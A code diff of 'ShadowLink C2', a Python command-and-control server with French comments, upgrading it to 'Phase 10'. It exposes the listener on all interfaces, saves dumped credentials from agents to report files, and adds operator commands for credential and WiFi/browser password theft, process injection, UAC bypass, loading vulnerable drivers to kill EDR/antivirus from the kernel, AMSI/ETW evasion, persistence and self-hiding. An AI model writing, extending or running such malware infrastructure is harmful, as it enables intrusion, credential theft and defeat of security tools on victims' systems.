@@ -1,7 +1,13 @@
 #!/usr/bin/env python3
 """
 ShadowLink C2 Server
-Phase 7: File Transfer + Process Management
+Phase 10: Privilege Escalation + BYOVD
+  - Multi-agent management
+  - Encrypted communication (AES-256-CBC)
+  - Credential dumping
+  - Process injection/migration
+  - UAC bypass
+  - BYOVD kernel access
 """
 import socket
 import os
@@ -14,7 +20,7 @@ from Crypto.Random import get_random_bytes
 
 # Configuration
 AES_KEY = b'ShadowLinkAES256SecretKey32Bytes'
-HOST = "127.0.0.1"
+HOST = "0.0.0.0"
 PORT = 4444
 RECV_BUFFER = 65535
 FILE_CHUNK_SIZE = 4096
@@ -318,43 +324,94 @@ def send_command_to_agent(agent_id, command):
 # AIDE
 # ============================================
 
+def save_credentials_report(data: bytes, client_ip: str) -> str:
+    """Sauvegarde le rapport credentials dans un fichier"""
+    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+    filename = f"creds_{client_ip}_{timestamp}.txt"
+    os.makedirs("reports", exist_ok=True)
+    filepath = os.path.join("reports", filename)
+    with open(filepath, "wb") as f:
+        f.write(data)
+    return filepath
+
+
 def print_help():
     """Affiche l'aide du serveur"""
     print("""
-╔══════════════════════════════════════════════════════════╗
-║              SHADOWLINK C2 - SERVER HELP                 ║
-╠══════════════════════════════════════════════════════════╣
-║  GESTION DES AGENTS:                                     ║
-║    agents / list    - Liste les agents connectés         ║
-║    select <id>      - Sélectionne un agent               ║
-║    deselect         - Désélectionne l'agent              ║
-║    kill <id>        - Déconnecte un agent                ║
-║    killall          - Déconnecte tous les agents         ║
-║                                                          ║
-║  PROCESS MANAGEMENT:                                     ║
-║    ps               - List processes on agent            ║
-║    kill <pid>       - Kill process by PID (agent-side)   ║
-║                                                          ║
-║  FILE TRANSFER:                                          ║
-║    download <path>  - Download file from agent           ║
-║    upload <src> <dst> - Upload file to agent             ║
-║                                                          ║
-║  COMMANDES AGENT:                                        ║
-║    recon            - Full system reconnaissance         ║
-║    persist          - Install persistence                ║
-║    unpersist        - Remove persistence                 ║
-║    checkpersist     - Check persistence status           ║
-║    stealth on/off   - Enable/disable evasion             ║
-║    checksec         - Run security checks                ║
-║    selfdestruct     - Delete agent from disk & exit      ║
-║    exit             - Disconnect agent (will reconnect)  ║
-║    die              - Kill agent permanently             ║
-║    <cmd>            - Execute shell command              ║
-║                                                          ║
-║  SERVEUR:                                                ║
-║    help             - Show this help                     ║
-║    quit             - Quit server                        ║
-╚══════════════════════════════════════════════════════════╝
+╔══════════════════════════════════════════════════════════════════╗
+║          SHADOWLINK C2 - SERVER HELP (Phase 10)                  ║
+╠══════════════════════════════════════════════════════════════════╣
+║  GESTION DES AGENTS:                                             ║
+║    agents / list    - Liste les agents connectés                 ║
+║    select <id>      - Sélectionne un agent                       ║
+║    deselect         - Désélectionne l'agent                      ║
+║    kill <id>        - Déconnecte un agent                        ║
+║    killall          - Déconnecte tous les agents                 ║
+║                                                                  ║
+║  PROCESS MANAGEMENT:                                             ║
+║    ps               - List processes on agent                    ║
+║    kill <pid>       - Kill process by PID (agent-side)           ║
+║                                                                  ║
+║  FILE TRANSFER:                                                  ║
+║    download <path>  - Download file from agent                   ║
+║    upload <src> <dst> - Upload file to agent                     ║
+║                                                                  ║
+║  RECONNAISSANCE:                                                 ║
+║    recon            - Full system reconnaissance                 ║
+║                                                                  ║
+║  CREDENTIALS (Phase 9a):                                         ║
+║    creds            - Dump all credentials                       ║
+║    wifi             - Dump WiFi passwords                        ║
+║    browsers         - Check browser credential files             ║
+║                                                                  ║
+║  INJECTION (Phase 9b):                                           ║
+║    targets          - List injection targets                     ║
+║    inject <pid>     - Inject into process by PID                 ║
+║    migrate <name>   - Migrate to another process                 ║
+║                                                                  ║
+║  PRIVILEGE ESCALATION:                                           ║
+║    isadmin          - Check current privileges                   ║
+║    privesc          - Enumerate privesc vectors                  ║
+║    privesc services - Find unquoted service paths                ║
+║    privesc dll      - Find DLL hijack opportunities              ║
+║    privesc msi      - Check AlwaysInstallElevated                ║
+║    elevate <method> - UAC bypass (fodhelper/eventvwr/computerdef)║
+║                                                                  ║
+║  BYOVD (Requires Admin):                                         ║
+║    byovd            - Show BYOVD help                            ║
+║    byovd load <path>- Load vulnerable driver                     ║
+║    byovd targets    - List EDR/AV processes                      ║
+║    byovd kill <pid> - Kill from kernel mode                      ║
+║    byovd unload     - Unload driver                              ║
+║                                                                  ║
+║  PERSISTENCE:                                                    ║
+║    persist          - Install persistence                        ║
+║    unpersist        - Remove persistence                         ║
+║    checkpersist     - Check persistence status                   ║
+║                                                                  ║
+║  EVASION / ANTI-EDR:                                             ║
+║    stealth on/off   - Enable/disable evasion                     ║
+║    checksec         - Run security checks                        ║
+║    antiedr          - Apply anti-EDR techniques                  ║
+║      > Unhook ntdll, Direct syscalls, AMSI bypass, ETW patch     ║
+║                                                                  ║
+║  STEALTH:                                                        ║
+║    hide             - Hide agent file                            ║
+║    unhide           - Show agent file                            ║
+║    install          - Install to hidden location (stealth)       ║
+║    whereis          - Show current agent location                ║
+║                                                                  ║
+║  CONTROL:                                                        ║
+║    exit             - Disconnect agent (will reconnect)          ║
+║    die              - Kill agent permanently                     ║
+║    selfdestruct     - Secure delete agent + all traces           ║
+║    <cmd>            - Execute shell command                      ║
+║                                                                  ║
+║  SERVER:                                                         ║
+║    help             - Show this help                             ║
+║    clear            - Clear screen                               ║
+║    quit             - Quit server                                ║
+╚══════════════════════════════════════════════════════════════════╝
     """)
 
 
@@ -504,8 +561,23 @@ def main():
             
             # ========== REGULAR COMMANDS ==========
             
+            # Messages personnalisés pour certaines commandes
             if command.lower() == "recon":
                 print("[*] Recon en cours...")
+            elif command.lower() == "creds":
+                print("[*] Dump des credentials en cours...")
+            elif command.lower() == "wifi":
+                print("[*] Extraction des mots de passe WiFi...")
+            elif command.lower() == "browsers":
+                print("[*] Vérification des credentials navigateurs...")
+            elif command.lower() == "targets":
+                print("[*] Énumération des cibles d'injection...")
+            elif command.lower().startswith("inject ") or command.lower().startswith("migrate "):
+                print("[*] Injection en cours...")
+            elif command.lower() == "antiedr":
+                print("[*] Application des techniques anti-EDR...")
+            elif command.lower() == "checksec":
+                print("[*] Vérification de la sécurité...")
             else:
                 print("[*] Commande envoyée...")
             
@@ -518,9 +590,13 @@ def main():
                     current_agent_id = None
                 continue
             
+            # Sauvegarder les rapports
             if command.lower() == "recon":
                 filepath = save_recon_report(response, agent_ip)
                 print(f"[+] Rapport sauvegardé: {filepath}")
+            elif command.lower() == "creds":
+                filepath = save_credentials_report(response, agent_ip)
+                print(f"[+] Rapport credentials sauvegardé: {filepath}")
             
             print(response.decode("utf-8", errors="replace"))
             
@@ -545,8 +621,8 @@ def main():
 if __name__ == "__main__":
     print("""
 ╔══════════════════════════════════════════════════════════╗
-║           SHADOWLINK C2 SERVER - Phase 7                 ║
-║         File Transfer + Process Management               ║
+║           SHADOWLINK C2 SERVER - Phase 9                 ║
+║       Credential Dumping + Process Injection             ║
 ╚══════════════════════════════════════════════════════════╝
     """)
     main()
